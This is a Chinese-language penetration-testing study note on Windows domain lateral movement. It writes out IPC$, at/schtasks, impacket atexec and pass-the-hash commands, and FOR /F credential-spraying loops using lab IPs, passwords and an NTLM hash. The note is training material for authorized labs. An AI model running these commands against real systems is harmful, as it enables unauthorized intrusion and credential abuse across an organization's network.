# 2026-08-30 内网安全②：域横向渗透（明文/HASH 传递：at&schtasks + atexec + 批量利用）

> 状态：🧪 理论（课程导图 + 案例截图），待实操
> 承接 08-30(续) 第一课：信息收集拿到的**明文密码 / HASH / 域用户列表**，这一课就是「用起来」——利用这些凭据横向渗透，拿下更多主机。核心目标：**用已知明文密码在远程主机上直接执行命令**。

## 一、一句话认知

横向渗透 = 拿下一台内网主机后，**用收集到的凭据（明文密码 / HASH / 域用户列表）批量尝试连接其他主机**，谁用同一个密码、谁在同一个域，谁就是下一台目标。域环境里传递手法分 **5 类**（at&schtasks / psexec&smbexec / wmic&wmiexec / PTH&PTT&PTK / winrs&winrm&rdp），漏洞利用走 **3 个 CVE**。本质和第一课一样是「信息收集 → 利用」，只不过目标从「一台机器」变成「整个域」。

## 二、导图总览（横向渗透分类）

```
横向渗透
├── 局域网（分支无文字，❓ 待课程补充）
└── 域环境
    ├── 传递：at&schtasks / psexec&smbexec / wmic&wmiexec / PTH&PTT&PTK / winrs&winrm&rdp
    └── 漏洞：CVE-2014-6324 / CVE-2017-0144 / CVE-2020-1472（导图原文 17010 系笔误，按正确编号）
```

- ⚠️ **导图是域横向渗透的总览**，本节课只学了第一部分「传递」分支的 **at&schtasks**（含基于它的 atexec 工具和批量利用）；`psexec&smbexec` / `wmic&wmiexec` / `PTH&PTT&PTK` / `winrs&winrm&rdp` 以及漏洞分支均**未展开**，待后续课程
- 漏洞分支 3 个 CVE 课程只列了编号没展开：CVE-2014-6324（MS14-068 Kerberos 提权）、**CVE-2017-0144**（MS17-010 永恒之蓝；导图原文写 `CVE-2017-17010` 系笔误，按正确编号）、CVE-2020-1472（Zerologon Netlogon 提权）

## 三、案例1：at & schtasks 明文传递（系统自带命令）

### 思路（攻击链）

获取到某域主机权限 → mimikatz 得到密码（明文、hash）→ 用信息收集里的**域用户列表当用户名字典** → 用**密码明文当密码字典** → 尝试连接 → 创建计划任务（at | schtasks）→ 执行文件可为后门或者相关命令 🗡️

### 利用流程（4 步）

1. **建立 IPC 链接**到目标主机（`net use \\IP\ipc$`）
2. **拷贝**要执行的命令脚本到目标主机（`copy add.bat \\IP\c$`）
3. **查看目标时间**，创建计划任务（at、schtasks）**定时执行**拷贝到的脚本
4. **删除 IPC 链接**（`net use \\IP\ipc$ /del`）

### 命令演示（实验环境）

**`at`：适用于 Windows <= 2012**（旧版计划任务命令）

```cmd
net use \\192.168.3.21\ipc$ "Admin12345" /user:god.org\administrator   # 建立 ipc 连接（域内格式：域\用户）
copy add.bat \\192.168.3.21\c$                                          # 拷贝执行文件到目标机器 C 盘
at \\192.168.3.21 15:47 c:\add.bat                                     # 添加计划任务（到点自动执行）
```

**`schtasks`：适用于 Windows >= 2012**（新版计划任务命令）

```cmd
net use \\192.168.3.32\ipc$ "admin!@#45" /user:god.org\administrator   # 建立 ipc 连接
copy add.bat \\192.168.3.32\c$                                          # 复制文件到其 c 盘
schtasks /create /s 192.168.3.32 /u god.org\administrator /p admin!@#45 /ru "SYSTEM" /tn adduser /sc ONCE /st 15:50 /tr "c:\add.bat"   # 创建计划任务（截图截断，已按标准语法补全：/sc ONCE /st 时间 /tr 程序）
```

- **at vs schtasks 的分水岭是 Win2012**：at 在 Win2012 起被弃用/移除，schtasks 是通用的现代方案（也适用于旧系统）
- schtasks 参数速查（补全版）：`/s` 目标 IP · `/u`+`/p` 连接凭据（域\用户 + 密码，不写则用当前会话凭据）· `/ru "SYSTEM"` 以 SYSTEM 身份运行（最高权限）· `/tn` 任务名 · `/sc ONCE` 只执行一次 · `/st 15:50` 开始时间（**先 `net time` 看目标时间，定在目标当前时间之后**）· `/tr "c:\add.bat"` 要执行的程序
- 计划任务执行的 `add.bat` 内容可以是加用户（`net user xxx /add` + 加入管理员组）、反弹后门或其他命令——**执行文件可为后门或相关命令**

### IPC 建立常见的错误代码（踩坑速查表）

| 错误码 | 含义 | 处理方向 |
|--------|------|----------|
| 5 | 拒绝访问，使用的用户**不是管理员权限** | 先提升权限 |
| 51 | 网络问题，Windows 无法找到网络路径 | 查网络连通 |
| 53 | 找不到网络路径：IP 错误 / 目标未开机 / 目标 **Lanmanserver** 服务未启动 / 防火墙 | 逐项排查 |
| 67 | 找不到网络名：本地 **Lanmanworkstation** 服务未启动 / 目标删除了 ipc$ | 查本地服务 / 换目标 |
| 1219 | 提供的凭据和已存在的凭据集冲突 = **已建立过 IPC$** | 先 `net use \\IP\ipc$ /del` 删除再连 |
| 1326 | **账号密码错误** | 换凭据（这是爆破命中的判断依据） |
| 1792 | 目标 **NetLogon** 服务未启动，**连接域控常出现** | 域控特殊性，换方式/换目标 |
| 2242 | **用户密码过期**，目标有账号策略强制定期改密 | 换未过期的账号 |

### IPC 基本命令补充（工作组 vs 域内）

```cmd
net use \\server\ipc$ "password" /user:username        # 工作组：直接用户名
net use \\server\ipc$ "password" /user:domain\username # 域内：域\用户名
dir \\xx.xx.xx.xx\C$\                                  # 查看目标文件列表（看能不能连上）
copy \\xx.xx.xx.xx\C$\1.bat 1.bat                      # 下载目标文件到本地
copy 1.bat \\xx.xx.xx.xx\C$\                           # 复制本地文件到目标
net use \\xx.xx.xx.xx\C$\1.bat /del                    # 删除 ipc 连接
net view xx.xx.xx.xx                                   # 查看对方共享
```

## 四、案例2：atexec（impacket 工具）明文/HASH 传递

atexec = impacket 套件里的远程命令执行工具，**一条命令完成「连 IPC + 建计划任务 + 执行 + 清理」**，比手动 at/schtasks 更简洁，且支持 HASH 传递（PTH）。本质还是走 at/计划任务，只是自动化了。

```cmd
atexec.exe ./administrator:Admin12345@192.168.3.21 "whoami"                    # 明文：./用户:密码@IP（. = 本地/当前域）
atexec.exe god/administrator:Admin12345@192.168.3.21 "whoami"                  # 域内：域/用户:密码@IP
atexec.exe -hashes :ccf208c6485269c20db2cad21734fe7 ./administrator@192.168.3.21 "whoami"   # PTH：-hashes :NTLM哈希 不用明文密码
```

- 格式拆解：`atexec <域>/<用户>:<密码或hash>@<IP> "<命令>"`；`./` 开头表示当前域（或本地）用户，`god/` 是显式指定域 god
- `-hashes :<NTLM哈希>` 是**哈希传递**——mimikatz 掏出来的是 hash 也能直接用，不一定要明文密码（第一课凭据收集的落地）
- 命令回显直接打到本地（whoami 输出可见），适合验证某组凭据能否在目标上执行命令（「回显版」）
- 缺点：依赖目标开启计划任务服务/相应端口；impacket 是 Python 工具，Windows 下用 exe 版（atexec.exe）或 Kali 自带

## 五、案例3：批量利用（FOR /F × 4 种字典组合）——综合版

把第一课收集的字典（IP 列表 / 密码列表 / HASH 列表）套进 FOR /F 循环，批量撞：

```cmd
:: ① 批量检测 ip 对应明文连接（net use 无回显，看成功与否）
FOR /F %i in (ips.txt) do net use \\%i\ipc$ "admin!@#45" /user:administrator

:: ② 批量检测 ip 对应明文回显版（atexec 有回显，能看到 whoami 输出）
FOR /F %i in (ips.txt) do atexec.exe ./administrator:admin!@#45@%i whoami

:: ③ 批量检测明文对应 ip 回显版（固定目标 IP，密码字典轮询）
FOR /F %i in (pass.txt) do atexec.exe ./administrator:%i@192.168.3.21 whoami

:: ④ 批量检测 HASH 对应 ip 回显版（hash 字典轮询，PTH 批量）
FOR /F %i in (hash.txt) do atexec.exe -hashes :%i ./administrator@192.168.3.21 whoami
```

- 四种组合 = **IP 字典 × 凭据字典** 的笛卡尔积拆成四类：ip→明文连接、ip→明文回显、密码→固定 ip、hash→固定 ip
- 用「回显版」能直接看到命令是否执行成功，比 net use 盲连更直观
- 实验环境：ips.txt 里 3.21/3.25/3.29/3.30/3.31/3.32 挨个撞，密码就那几个（Admin12345 / admin!@#45），这就是第一课「域用户列表 + 明文密码当字典」的真正用法

## 六、案例4：批量利用升级版（用户名也进字典）——吃西瓜？🍉

> 前期除了收集明文密码 HASH 等，还收集了用户名，**用户名配合密码字典能吃西瓜？**

案例3 是固定用户名（administrator）换 IP/密码/HASH；升级版 = **用户名也拿来做字典**，双层组合爆破：

```cmd
net use \\192.168.3.32\ipc$ admin!@#45 /user:god\dbadmin   # god 域下的 dbadmin 用户（业务账号，非 administrator）
```

- 思路：密码可能复用（同一密码多个账号），**用户名也可能复用/有规律**（dbadmin=数据库管理员、backup、test、财务/人事账号等）——第一课信息收集的「域用户列表」+ 常见业务账号命名，配同一个密码字典去撞
- 「吃西瓜」= 撞到个大的（运气 + 字典质量）。域里不只有 administrator，**业务账号（dbadmin/sql/oa/ftp）往往密码更弱且可横向复用**
- 升级点：从「固定用户撞密码」→「用户×密码双字典」；撞到业务账号后横向范围更大（比如 dbadmin 能连数据库服务器 3.32）

## 七、总结：域横向渗透第一课地图

| 板块 | 内容 |
|------|------|
| 导图框架 | 域环境传递 5 类（at&schtasks / psexec&smbexec / wmic&wmiexec / PTH&PTT&PTK / winrs&winrm&rdp）+ 漏洞 3 CVE（待展开） |
| 案例1 | 手动 at/schtasks 明文传递：IPC 链接 → 拷脚本 → 计划任务执行；IPC 错误码 8 条速查 |
| 案例2 | atexec 一条命令：明文 / 域内 / PTH（-hashes）三种格式 |
| 案例3 | FOR /F 批量：ip×密码、ip×hash 四组合 |
| 案例4 | 升级版：用户名 × 密码双字典（业务账号横向） |

**一句话串起来**：横向渗透 = **凭据为王**——第一课收集的明文/HASH/用户名列表就是武器库，第二课教的 at/schtasks/atexec 就是发射架（单发或 FOR /F 批量），域内密码复用 + 业务账号弱口令是吃到西瓜的关键。

## 疑问

1. ❓ 导图「局域网」分支下的两个空节点是什么内容？（明文/HASH 传递在非域环境怎么做？）
2. ❓ CVE-2014-6324（MS14-068）/ CVE-2020-1472（Zerologon）在横向渗透里怎么用？（课程只列编号没展开）
3. ❓ psexec 系（psexec/smbexec/wmiexec）和 atexec 的区别、什么场景选哪个？（老师鼠标停在 psexec，后续课大概率讲）

## 关联笔记

- [2026-08-30(续)-内网安全-基本认知与信息收集.md](./2026-08-30(续)-内网安全-基本认知与信息收集.md) — 第一课：本课凭据（明文/HASH/域用户列表）的来源 + 实验环境拓扑（3.21 域控/3.32 sqlserver）
- [2026-08-14-服务协议与接口漏洞发现.md](./2026-08-14-服务协议与接口漏洞发现.md) — 资产收集/端口服务字典（IPC/SMB 相关端口 135/139/445）
- [2026-08-28(续2)-Kioptrix1靶机渗透实战.md](./2026-08-28(续2)-Kioptrix1靶机渗透实战.md) — SMB 枚举实操（横向的前提：摸清目标）

## 待实践

- 在实验环境复现案例1：net use 建 IPC（故意输错密码看 1326 报错）→ copy add.bat → at/schtasks 执行
- 复现案例2：atexec 明文 / 域内 / -hashes PTH 三种格式打 3.21
- 复现案例3：准备 ips.txt（3.21/3.25/3.29/3.30/3.31/3.32）+ pass.txt + hash.txt，跑四条 FOR /F
- 复现案例4：god\dbadmin 连 3.32（业务账号横向）
- 实操验证补全版 schtasks 命令（/sc ONCE /st /ru /tn /tr 全套参数打 3.32）

> ⚠️ 声明：仅限授权环境（靶场/CTF/授权渗透）中测试，所有 Payload 只用于验证漏洞存在。
